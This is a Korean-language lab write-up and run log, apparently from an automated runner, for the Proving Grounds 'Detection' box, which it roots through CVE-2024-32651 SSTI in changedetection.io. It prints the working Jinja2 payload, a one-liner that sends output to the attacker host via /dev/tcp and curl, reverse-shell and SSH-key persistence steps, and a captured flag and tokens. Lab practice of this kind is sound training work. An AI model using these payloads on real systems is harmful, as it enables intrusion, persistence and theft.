# Detection — 러너 실행 기록 (2026-08-21, 미완 · 리버트 필요)

- 타겟 192.168.248.97 · Fundamental · Linux(Ubuntu 20.04) · 플래그 1개
- 판정: **부분 (0/1)** — RCE·root 실행권한 확보 확인, **셸 획득까지 성공**, 그러나 플래그 회수 전에 진입점(5000/tcp)을 **내 페이로드가 데드락시켜** 재접속 불가
- 산출물: `~/PG/Detection/` (Kali) · `writeup_notes.txt` 에 시간순 전량

## 1. 정찰 (13:38:57 시작, 즉시구간 31초)

`~/PG/_lib/recon.sh 192.168.248.97 Detection`

| 포트 | 서비스 | 근거 파일 |
|---|---|---|
| 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 | `nmap-quick.txt` |
| 5000/tcp | changedetection.io (nmap 배너는 `Python http.server 3.5 - 3.10` = werkzeug 시그니처) | `nmap-quick.txt` · `web-5000/root.body` |

- `-p-` 전체 스캔 · UDP top-100 → **22·5000 외 없음**, UDP 전부 closed (`nmap-full.txt`, `nmap-udp-top100.txt`)
- gobuster: `/login` `/logout` `/backup` `/import`
- **인증 게이트 없음** — `/` 가 200, 워치 목록이 그대로 노출

### 버전 판정 — 독립 근거 2개
1. `web-5000/root.body` 내 문자열 `v0.45.1`
2. `shot_5000_root.png` 우상단 UI 버전 배지 `v0.45.1` (볼트 이관 완료)

→ **CVE-2024-32651** (changedetection.io ≤0.45.20 Jinja2 SSTI) 대상 확정.

## 2. 익스플로잇 — 브리핑과 어긋난 지점

### 반증 ①: 트리거는 「Send test notification」이 아니라 **설정 저장 그 자체**
브리핑 4단계는 "notification body 에 페이로드를 넣고 test 로 콜백 확인"이었다. 실제로는:

- `/notification/send-test` 로 보낸 알림의 message 가 **저장한 본문이 아니라 기본 본문**(`{{watch_url}} had a change.`)이었다 — 443 리스너에 도착한 apprise POST 원문으로 확인
- 그런데 **80 리스너에는 콜백이 이미 도착해 있었다**:
  ```
  192.168.248.97 - - [21/Aug/2026 13:41:54] "GET /hit-p1-dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1" 404 -
  ```
  base64 디코드 → `uid=0(root) gid=0(root) groups=0(root)`
- 즉 SSTI 는 **`POST /settings` 의 폼 검증(notification body 렌더)** 단계에서 실행된다. test 알림은 불필요하다.
- 13:42 의 title/body 마커 분리 실험(`/hit-title`·`/hit-body` 둘 다 콜백)으로 재확인

출처: `~/PG/Detection/listener/http80.log`, `nc443.log`

### 통한 페이로드
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('<명령>').read() }}
```
- 저장 스크립트: `~/PG/Detection/ssti/save_settings.py` (세션 쿠키 + csrf 회수 → 전체 필드 POST → 저장 확인 → send-test)
- **jinja 문자열은 홑따옴표로 감싸고 명령 안쪽은 큰따옴표만 쓴다.** 처음에 반대로 만들어 중첩 큰따옴표로 페이로드가 깨졌다(`p4_diag.j2` 1차 생성물)

### 반증 ②: 「80만 열려 있다」가 아니다 — 443 아웃바운드 확인됨
1차 리버스셸(443)이 안 붙어 방화벽을 의심했으나, `ss` 로 보니 **192.168.248.220 이 우리 443 에 붙어 `-k` 없는 nc 를 점유**하고 있었다. 계층 분리 진단:
```
O=$( (timeout 6 bash -c "echo TEST443 > /dev/tcp/192.168.45.207/443") 2>&1 | base64 -w0 ); curl -s http://192.168.45.207/diag443-$O
```
→ 콜백이 `GET /diag443-` (base64 **빈 문자열**) = stderr 없음 = 연결 성공. nc 로그에 `TEST443` 수신.
**80·443 둘 다 아웃바운드 허용.**

### 셸 획득 (13:45)
python3 pty 리버스셸 → `root@detection:/#` (`~/PG/Detection/pty_shell_evidence.log`)
```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.97] 37522
root@detection:/#
```

## 3. 사고 — 진입점을 내가 죽였다

**원인 (확정):** `popen(...).read()` 가 **블로킹**이다. `pty.spawn` 리버스셸을 popen 안에서 돌리면
`sh` 가 파이프라인 종료를 기다리며 popen 파이프 write end 를 계속 잡고 있어 **flask 요청 스레드가 영구 블로킹**된다.
이 앱은 요청을 사실상 순차 처리해 **한 방으로 서비스 전체가 멈춘다.**

**악화시킨 조작:** Kali 측 nc 를 `kill -9` 로 죽였다. 이때 소켓이 **정상 종료(FIN)** 되었고,
Python 3.8 `pty.spawn._copy` 는 stdin EOF 시 `fds.remove(STDIN_FILENO)` 로 **감시 대상에서 빼기만** 한다.
이후 master_fd(bash) 만 기다리며 영구 대기 → 나중에 보낸 RST 도 읽히지 않는다.

**복구 시도 (전부 실패):**
1. Kali 고아 리스너 PID 특정 후 `kill -9` (광범위 pkill 미사용)
2. scapy 로 타겟 고아 소켓 강제 종료 — ESTAB 소켓에 SYN 을 보내 challenge ACK 를 유도하고, Kali 커널이 매칭 소켓 없이 RST(seq=rcv_nxt)로 응답하게 만듦. **TCP 계층에서는 성공**(pcap: 이후 타겟이 `R.` 응답 = 소켓 소멸). 그러나 위 이유로 python3 는 살아남음
3. 배경 부하 제거(gobuster·전체스캔 tmux 종료) 후 재시도 — 무효

**최종 상태 (14:00 확인):**
```
22/tcp   open     ssh
5000/tcp filtered upnp
```
tcpdump 상 SYN 9회 전부 **무응답** = accept 백로그 포화. 앱은 LISTEN 이나 accept 하지 않는다.
**인바운드로 타겟 프로세스를 죽일 방법이 없어 리버트가 유일한 해소 수단.**

## 4. 리버트 후 재공략 — 원샷 스크립트 스테이징 완료

`~/PG/Detection/ssti/pwn.sh <타겟IP>`
1. `p6_sshkey.j2` — SSTI 로 root `authorized_keys` 에 `det_key.pub` 추가 (popen 이 **즉시 반환**하는 비블로킹 명령만 사용)
2. `ssh -i ~/PG/Detection/ssti/det_key root@<타겟>` → 진짜 pty. 앱에 의존하지 않고 tmux `capture-pane` 도 정상 동작

리버스셸을 다시 쓸 경우 **반드시 분리**할 것:
```
setsid nohup bash -c "..." >/dev/null 2>&1 </dev/null &
```

## 5. 증적 현황

| 항목 | 상태 |
|---|---|
| 스크린샷 | 1장. `파일보관\PG-Detection-changedetection-index-5000.png` **볼트 이관 완료** (v0.45.1 배지 판독 가능). 설정·알림 화면은 앱 다운으로 미확보 |
| `proof_root.txt` | **없음** — 플래그 미회수 |
| pty 증거 | `~/PG/Detection/pty_shell_evidence.log` (`root@detection:/#`) |
| `cleanup.txt` | 작성 완료. Kali 측 원복 확인, 타겟 측은 리버트로만 해소 |
| 실패 로그 | 전량 보존 (0바이트 `probe-interesting.txt` 포함) |
| 시간순 노트 | `~/PG/Detection/writeup_notes.txt` (50행) |

## 6. 노트

`03. PG\Detection.md` **미작성.** 리버트 후 플래그까지 회수한 다음 한 번에 쓰는 것이 맞다고 판단했다 —
지금 쓰면 5장(플래그)이 빈 채로 나가고 리버트 후 전면 개작이 된다. 6장 재료는 `writeup_notes.txt` 에 전량 보존.

---

# 2차 (리버트 후) — 완료 2026-08-21 14:11 KST

- 판정: **완료 (1/1)**. 「걷을 것을 다 걷음」 — 스크린샷 볼트 이관 2장 · `proof_root.txt`(대화형 pty) · `cleanup.txt` 원복 완료.
- 재공략: `pwn.sh` (비블로킹 SSTI 로 root SSH 키 심기) → `ssh -i det_key root@타겟` 대화형 pty.
- **플래그 먼저 회수** → `/backup` → `harvest.sh`(1 flag 확정) → 스크린샷 → 정리. 순서 지침 준수.

## 플래그
- `/root/proof.txt` = **05a2b432fb4eb4091fb7ed500bb7a9bd** (33바이트, root only, 박스 유일)
- 전수 탐색(harvest FLAGS): `/root/proof.txt` 하나뿐. user flag 없음 → 포털 0/1 과 일치

## /backup (무인증, 40696 bytes zip) 내용 요약
- `url-watches.json` — api_access_token `f7fb037bd530a6579c7a42df63fdd25a`, **password: false**(앱 비번 미설정)
- `secret.txt` — `137b8accc9644a824600a5af0c6c57e9cef76ee8c3c55731143dd6731002f5a8`
- `url-list.txt`(감시 URL 2개), watch 히스토리(.br brotli). **추가 플래그 없음**

## 스크린샷 (볼트 이관)
- `PG-Detection-changedetection-index-5000.png` (1차, index+v0.45.1 배지) — 이미 이관됨
- `PG-Detection-notification-ssti-payload.png` (2차, Notification Body 에 SSTI 페이로드) — 신규 이관
- md5 3종 상이 확인. import 스크린샷은 미이관(불필요)

## 정리 (cleanup.txt)
- 타겟: SSH키 제거+파일삭제, /tmp 임시파일 삭제, /settings 원복
- Kali: 리스너·tmux 전부 종료 확인. pkill 미사용
